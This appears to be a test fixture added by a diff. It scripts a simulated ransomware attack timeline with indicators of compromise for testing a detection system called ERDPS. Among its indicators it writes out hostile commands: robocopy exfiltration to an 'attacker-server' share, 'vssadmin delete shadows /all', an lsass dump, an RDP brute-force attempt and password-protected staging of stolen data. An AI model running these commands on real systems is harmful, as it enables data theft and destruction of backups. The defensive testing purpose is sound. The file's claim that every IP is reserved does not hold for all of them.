@@ -1,0 +1,194 @@
+# ERDPS Test Story - Simulated Ransomware Attack Scenario
+# ========================================================
+# This file contains a fictional malware scenario for comprehensive ERDPS testing
+# WARNING: This is for testing purposes only - contains simulated malware indicators
+
+## ATTACK TIMELINE - "CryptoLocker Variant Simulation"
+
+### Phase 1: Initial Infection (T+00:00)
+- Suspicious email attachment: "Invoice_2024_URGENT.pdf.exe"
+- File dropped to: C:\Users\TestUser\Downloads\Invoice_2024_URGENT.pdf.exe
+- MD5: d41d8cd98f00b204e9800998ecf8427e (simulated)
+- SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 (simulated)
+- Process execution: Invoice_2024_URGENT.pdf.exe (PID: 1234)
+
+### Phase 2: Reconnaissance (T+00:30)
+- Registry enumeration: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
+- Network discovery: ping 192.168.1.1-254
+- File system enumeration: dir C:\ /s /b *.doc *.docx *.pdf *.jpg *.png
+- Process injection attempt: svchost.exe (PID: 5678)
+
+### Phase 3: Persistence (T+01:00)
+- Registry modification: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate
+- Service creation: "Windows Security Update Service" (malicious)
+- Scheduled task: "SystemMaintenanceTask" -> C:\Windows\Temp\sysupdate.exe
+- Mutex creation: "Global\CryptoLock2024Mutex"
+
+### Phase 4: Lateral Movement (T+01:30)
+- SMB enumeration: net view \\192.168.1.0/24
+- Credential harvesting: lsass.exe memory dump attempt
+- Network share discovery: net use * /delete /y && net use
+- RDP brute force: 192.168.1.100:3389 (admin/password123)
+
+### Phase 5: Data Exfiltration Preparation (T+02:00)
+- File collection: robocopy C:\Users \\attacker-server\data /MIR /XD "Windows" "Program Files"
+- Compression: 7z.exe a -p"infected2024" stolen_data.7z C:\Users\*\Documents\*
+- Staging directory: C:\Windows\Temp\backup_data\
+- DNS queries: exfil-server.malicious-domain.com
+
+### Phase 6: Encryption Phase (T+02:30)
+- Key generation: RSA-2048 + AES-256
+- File targeting: *.doc, *.docx, *.pdf, *.jpg, *.png, *.mp4, *.xlsx, *.ppt
+- Encryption pattern: original_file.ext -> original_file.ext.locked
+- Ransom note creation: "HOW_TO_DECRYPT_FILES.txt" in each directory
+- Desktop wallpaper change: "Your files have been encrypted!"
+
+### Phase 7: Network Communication (T+03:00)
+- C2 communication: POST https://malicious-c2.darkweb.onion/api/victim
+- Bitcoin wallet generation: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
+- Payment verification: GET https://blockchain.info/address/bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
+- Tor proxy usage: 127.0.0.1:9050
+
+## NETWORK TRAFFIC PATTERNS
+
+### Suspicious DNS Queries:
+- malicious-domain.com
+- c2-server.darknet.onion
+- bitcoin-payment.crypto.com
+- file-decrypt.ransom.net
+
+### HTTP/HTTPS Traffic:
+- User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) CryptoBot/2.0"
+- POST /api/register_victim HTTP/1.1
+- GET /download/decryptor.exe HTTP/1.1
+- POST /payment/verify HTTP/1.1
+
+### Network Connections:
+- TCP 192.168.1.100:49152 -> 185.220.101.42:443 (Tor exit node)
+- TCP 192.168.1.100:49153 -> 198.51.100.25:80 (C2 server)
+- UDP 192.168.1.100:53 -> 8.8.8.8:53 (DNS queries)
+
+## FILE SYSTEM INDICATORS
+
+### Suspicious Files Created:
+- C:\Windows\Temp\sysupdate.exe (malware dropper)
+- C:\Users\Public\Documents\decrypt_instructions.html
+- C:\ProgramData\WindowsUpdate\wuauserv.exe (fake service)
+- %APPDATA%\Microsoft\Windows\crypto_key.dat
+
+### File Modifications:
+- All user documents encrypted with .locked extension
+- Desktop wallpaper changed to ransom message
+- Browser homepage redirected to payment portal
+
+### Registry Modifications:
+- HKCU\Software\Microsoft\Windows\CurrentVersion\Run\CryptoService
+- HKLM\SYSTEM\CurrentControlSet\Services\FakeWindowsUpdate
+- HKCU\Control Panel\Desktop\Wallpaper (changed to ransom image)
+
+## PROCESS BEHAVIOR PATTERNS
+
+### Malicious Process Tree:
+```
+explorer.exe (PID: 1000)
+└── Invoice_2024_URGENT.pdf.exe (PID: 1234) [MALICIOUS]
+    ├── cmd.exe (PID: 1235) [SPAWNED]
+    ├── powershell.exe (PID: 1236) [SPAWNED]
+    ├── svchost.exe (PID: 1237) [INJECTED]
+    └── rundll32.exe (PID: 1238) [SPAWNED]
+```
+
+### Suspicious API Calls:
+- CreateFileW() - Mass file access
+- CryptGenRandom() - Encryption key generation
+- RegSetValueExW() - Registry persistence
+- CreateProcessW() - Process spawning
+- VirtualAllocEx() - Memory injection
+
+## YARA RULE TRIGGERS
+
+### Expected YARA Matches:
+1. Ransomware_Generic_Strings
+2. Crypto_API_Usage
+3. Registry_Persistence_Indicators
+4. Network_C2_Communication
+5. File_Encryption_Patterns
+
+### Sample Malicious Strings:
+- "Your files have been encrypted"
+- "Send Bitcoin to decrypt"
+- "CryptoLocker2024"
+- "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
+- "HOW_TO_DECRYPT_FILES.txt"
+
+## BEHAVIORAL INDICATORS
+
+### File System Behavior:
+- Rapid file access across multiple directories
+- Mass file renaming operations
+- Creation of ransom notes in directories
+- Deletion of shadow copies (vssadmin delete shadows /all)
+
+### Network Behavior:
+- Outbound connections to Tor network
+- DNS queries to suspicious domains
+- Large data uploads to external servers
+- Bitcoin blockchain queries
+
+### System Behavior:
+- High CPU usage during encryption
+- Unusual registry modifications
+- Service creation/modification
+- Scheduled task creation
+
+## TEST SCENARIOS FOR ERDPS
+
+### Scenario 1: Real-time Detection
+- Drop test file with malicious strings
+- Monitor YARA rule triggering
+- Verify alert generation and delivery
+
+### Scenario 2: Network Monitoring
+- Simulate C2 communication
+- Test DNS monitoring capabilities
+- Verify network alert generation
+
+### Scenario 3: Behavioral Analysis
+- Test process monitoring
+- Verify API hooking detection
+- Monitor file system changes
+
+### Scenario 4: IPC Communication
+- Test alert forwarding via IPC
+- Verify signature validation
+- Test command processing
+
+### Scenario 5: Quarantine Operations
+- Test file quarantine functionality
+- Verify process termination
+- Test network isolation
+
+## SAFE TESTING NOTES
+
+This scenario is designed for testing purposes only:
+- All IP addresses are example/reserved ranges
+- Bitcoin addresses are examples (not real)
+- Malware samples are simulated
+- No actual encryption or damage occurs
+- All indicators are fictional but realistic
+
+Use this story to test ERDPS detection capabilities, alert systems,
+network monitoring, and response mechanisms in a controlled environment.
+
+## EXPECTED ERDPS RESPONSES
+
+1. YARA Detection: Multiple rule matches on malicious strings
+2. Network Alerts: Suspicious DNS queries and C2 communication
+3. Behavioral Alerts: Process injection and mass file access
+4. IPC Notifications: Real-time alert forwarding
+5. Quarantine Actions: File isolation and process termination
+6. Metrics Collection: Performance and detection statistics
+7. Report Generation: Comprehensive incident reports
+
+This comprehensive test story provides realistic indicators for testing
+all ERDPS components while maintaining safety for the test environment.
